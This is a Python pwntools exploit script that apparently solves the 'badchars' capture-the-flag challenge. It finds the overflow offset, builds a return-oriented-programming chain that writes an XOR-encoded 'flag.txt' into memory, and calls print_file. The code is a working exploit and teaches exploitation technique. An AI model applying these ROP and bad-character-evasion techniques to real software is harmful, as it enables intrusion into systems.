from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    # Start the exploit against the target
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-gef
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './badchars'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================


def find_eip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter('>', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of RIP at the time of crashing
    pattern = p.corefile.read(p.corefile.rsp, 4)
    rip_offset = cyclic_find(pattern, alphabet='bcdefhijk')
    info('located RIP offset at {a}'.format(a=rip_offset))
    # Return the EIP offset
    return rip_offset


# Pass in pattern_size, get back EIP offset
eip_offset = find_eip(cyclic(100, alphabet='bcdefhijk'))

# Start program
io = start()
info(io.recvline_contains('badchars are'))

# Address of .data section (size=8 bytes)
# NOTE: had to add 2 onto this to get it to work :S
data_section_address = 0x601030
# We will pop the string (flag.txt) into r12
# Then pop address of .data section into r13
# NOTE: We don't need r14, r15 - was there a better way to do this? plz let me know :D
pop_r12_r13_r14_r15 = 0x40069c  # pop r12; pop r13; pop r14; pop r15; ret;
# We will then move the string from r12 (flag.txt) into memory location stored in r13
mov_r13_r12 = 0x400634  # mov qword ptr [r13], r12; ret;

# Pop XOR value (1 byte) into r14 and .data memory address into r15
pop_r14_r15 = 0x4006a0  # pop r14; pop r15; ret;
# XOR value pointed to by r15 with r14
xor_r15_r14 = 0x400628  # xor byte ptr [r15], r14b; ret;

# Needed at end to supply flag.txt as param to print_file
pop_rdi = 0x4006a3  # pop rdi; ret;
# Finally we call print file function, passing in the address of the string (flag.txt)
print_file = 0x400620

# Print out important addresses
info("%#x data_section_address", data_section_address)
info("%#x pop_r12_r13_r14_r15", pop_r12_r13_r14_r15)
info("%#x mov_r13_r12", mov_r13_r12)
info("%#x pop_r14_r15", pop_r14_r15)
info("%#x xor_r15_r14", xor_r15_r14)
info("%#x pop_rdi", pop_rdi)
info("%#x print_file", print_file)

# Since badchars are 'x', 'g', 'a', '.' and are all contained in flag.txt, we need to XOR before storing in memory
value_to_xor_with = 2
xored_string = xor('flag.txt', value_to_xor_with)
info("flag.txt XORd with %d: %s", value_to_xor_with, xored_string)

xor_xploit = b""
data_addr_offset = 0
# The output of this will be used to XOR back to 'flag.txt' after it's been written to .data
for c in xored_string:
    xor_xploit += pack(pop_r14_r15)  # Pop the next params into r14 and r15
    xor_xploit += pack(value_to_xor_with)  # Value to XOR with ('2' in our case)
    xor_xploit += pack(data_section_address + data_addr_offset)  # Address of .data section with offset to current char
    xor_xploit += pack(xor_r15_r14)  # XOR the value in memory address pointed to by r15 with the value in r14
    data_addr_offset += 1  # Add an extra byte to offset each loop until we've covered all chars

# Craft payload which injects "flag.txt" into data section of memory
# And calls print_file() with the string memory location
payload = flat(
    asm('nop') * eip_offset,  # Offset - 40 bytes
    pop_r12_r13_r14_r15,  # Pop 4 byte string (1) into r12 and .data location to r13 (2)
    xored_string,  # 1 - Note we can do 8 bytes as 64-bit
    data_section_address,  # 2
    0x00,  # r14 - don't need
    0x00,  # r15 - don't need
    mov_r13_r12,  # Move string from r12 (1) to memory location (2) stored in r13

    # Now we need to decode 'flag.txt' (it's still XORd with '2')
    xor_xploit,

    # Pop the data address to RDI and call print_file
    pop_rdi,
    data_section_address,
    print_file
)

# Send the payload to a new copy of the process
io.sendlineafter('>', payload)
io.recvuntil('Thank you!\n')

# Get our flag!
flag = io.recv()
success(flag)
